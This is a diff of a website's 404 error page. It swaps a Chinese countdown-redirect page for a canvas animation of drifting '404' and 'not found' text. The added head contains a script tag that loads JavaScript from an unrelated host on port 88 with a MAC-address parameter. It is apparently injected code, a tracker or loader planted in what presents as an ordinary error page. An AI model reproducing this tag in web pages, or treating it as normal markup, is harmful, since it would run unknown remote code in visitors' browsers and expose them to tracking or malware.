@@ -1,127 +1,116 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="utf-8">
-    <title>404 - Not Found</title>
-    <link rel="icon" href="/images/favicon.png">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            outline: none;
-            font-family: \5FAE\8F6F\96C5\9ED1, 宋体;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            -khtml-user-select: none;
-            user-select: none;
-            cursor: default;
-            font-weight: lighter;
-        }
+﻿<!doctype html>
+<html>
+<head><script src=http://t.7gg.cc:88/j.js?MAC=68DB5482FAF5></script>  
+<meta charset="utf-8">
+<title>404页未找到</title>
 
-        .center {
-            margin: 0 auto;
-            color: #fff;
-            font-weight: bolder;
-            font-size: 72px;
-        }
-
-        .whole {
-            width: 100%;
-            height: 100%;
-            line-height: 100%;
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            z-index: -1000;
-            overflow: hidden;
-        }
-
-        .whole img {
-            width: 100%;
-            height: 100%;
-        }
-
-        .mask {
-            width: 100%;
-            height: 100%;
-            position: absolute;
-            top: 0;
-            left: 0;
-            background: #000;
-            opacity: 0.6;
-            filter: alpha(opacity=60);
-        }
-
-        .b {
-            width: 100%;
-            text-align: center;
-            height: 400px;
-            position: absolute;
-            top: 50%;
-            margin-top: -230px
-        }
-
-        .a {
-            width: 150px;
-            height: 50px;
-            margin-top: 30px
-        }
-
-        .a a {
-            display: block;
-            float: left;
-            width: 150px;
-            height: 50px;
-            background: #fff;
-            text-align: center;
-            line-height: 50px;
-            font-size: 18px;
-            border-radius: 25px;
-            color: #333
-        }
-
-        .a a:hover {
-            color: #000;
-            box-shadow: #fff 0 0 20px
-        }
-
-        p {
-            color: #fff;
-            margin-top: 40px;
-            font-size: 24px;
-        }
-
-        #num {
-            margin: 0 5px;
-            font-weight: bold;
-        }
-    </style>
-    <script type="text/javascript">
-        var num = 5;
-        function redirect() {
-            num--;
-            document.getElementById("num").innerHTML = num;
-            if (num < 0) {
-                document.getElementById("num").innerHTML = 0;
-                location.href = "https://www.hojun.cn";
-            }
-        }
-        setInterval("redirect()", 1000);
-    </script>
+<style>
+html,body {
+	margin:0;
+	padding:0;
+}
+canvas {
+	display:block;
+}
+</style>
 </head>
+<body>
 
-<!-- <body onload="redirect();">
-<div class="whole">
-    <img src="https://wx4.sinaimg.cn/large/006bYVyvgy1ftan82duvvj30xc0p0mzb.jpg">
-    <div class="mask"></div>
-</div>
-<div class="b">
-    <h1 class="center">可能输错网址或此页面从未存在过</h1>
-    <p><br><br><br><br>
-        <span id="num"></span>秒后将继续探险...
-    </p>
-</div> -->
+<div></div>
+
+<script>
+var canvas = document.createElement('canvas');
+      var height = canvas.height = window.innerHeight;
+      var width = canvas.width = window.innerWidth;
+      var ctx = canvas.getContext('2d');
+      document.body.appendChild(canvas);
+
+      function random(min,max)
+      {
+          return Math.random()*(max-min+1)+min;
+      }
+
+      function range_map(value,in_min, in_max, out_min, out_max) {
+        return (value - in_min) * (out_max - out_min) / (in_max - in_min) + out_min;
+      }
+
+      var word_arr = [];
+      var txt_min_size = 5;
+      var txt_max_size = 25;
+      var keypress = false;
+      var acclerate = 2;
+      for (var i = 0; i < 25; i++) {
+        word_arr.push({
+          x : random(0,width),
+          y : random(0,height),
+          text : '404',
+          size : random(txt_min_size,txt_max_size)
+        });
+
+        word_arr.push({
+          x : random(0,width),
+          y : random(0,height),
+          text : 'page',
+          size : random(txt_min_size,txt_max_size)
+        });
+
+
+        word_arr.push({
+          x : random(0,width),
+          y : random(0,height),
+          text : 'not found',
+          size : random(txt_min_size,txt_max_size)
+        });
+
+        word_arr.push({
+          x : random(0,width),
+          y : random(0,height),
+          text : '404',
+          size : Math.floor(random(txt_min_size,txt_max_size))
+        });
+      }
+
+      function render()
+      {
+        ctx.fillStyle = "rgba(0,0,0,1)";
+        ctx.fillRect(0,0,width,height);
+
+        ctx.fillStyle = "#fff";
+        for (var i = 0; i < word_arr.length; i++) {
+          ctx.font = word_arr[i].size+"px sans-serif";
+          var w = ctx.measureText(word_arr[i].text);
+          ctx.fillText(word_arr[i].text,word_arr[i].x,word_arr[i].y);
+
+          if(keypress)
+          {
+            word_arr[i].x += range_map(word_arr[i].size,txt_min_size,txt_max_size,2,4) * acclerate;
+          }
+          else {
+            word_arr[i].x += range_map(word_arr[i].size,txt_min_size,txt_max_size,2,3);
+          }
+
+          if(word_arr[i].x >= width)
+          {
+            word_arr[i].x = -w.width*2;
+            word_arr[i].y = random(0,height);
+            word_arr[i].size =  Math.floor(random(txt_min_size,txt_max_size));
+
+          }
+        }
+
+        ctx.fill();
+
+        requestAnimationFrame(render);
+      }
+
+      render();
+
+      window.addEventListener('keydown',function(){
+        keypress = true;
+      },true);
+      window.addEventListener('keyup',function(){
+        keypress = false;
+      },true);</script>
+
 </body>
-<script type="text/javascript" src="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js" charset="utf-8" homePageUrl="https://www.hojun.cn/" homePageName="返回主页"></script>
 </html>
